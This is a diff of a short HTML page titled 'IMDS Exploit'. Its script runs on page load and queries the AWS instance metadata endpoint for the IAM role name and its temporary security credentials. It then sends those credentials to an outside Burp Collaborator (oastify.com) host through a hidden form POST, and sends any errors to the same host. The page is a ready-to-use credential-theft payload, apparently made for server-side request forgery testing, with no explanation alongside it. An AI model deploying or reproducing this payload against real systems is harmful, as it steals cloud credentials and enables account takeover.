@@ -1,10 +1,45 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>IMDS Exploit</title>
+</head>
 <body>
-    <h1>hello</h1>
     <script>
-        // Simple ping to Collaborator
-        fetch('https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com/ping');
+    async function exploit() {
+        const collab = 'https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com';
+        try {
+            // 1. Get role name
+            const roleRes = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+                headers: { 'Metadata-Flavor': 'AWS' }
+            });
+            if (!roleRes.ok) throw new Error('Role fetch failed');
+            const role = (await roleRes.text()).trim();
+
+            // 2. Get credentials
+            const credRes = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`, {
+                headers: { 'Metadata-Flavor': 'AWS' }
+            });
+            if (!credRes.ok) throw new Error('Cred fetch failed');
+            const creds = await credRes.text();
+
+            // 3. Exfiltrate via form POST (bypasses CORS)
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = collab;
+            form.enctype = 'application/x-www-form-urlencoded';
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'data';
+            input.value = creds;
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+        } catch (e) {
+            // Report error
+            fetch(collab + '?error=' + encodeURIComponent(e.message));
+        }
+    }
+    exploit();
     </script>
 </body>
 </html>
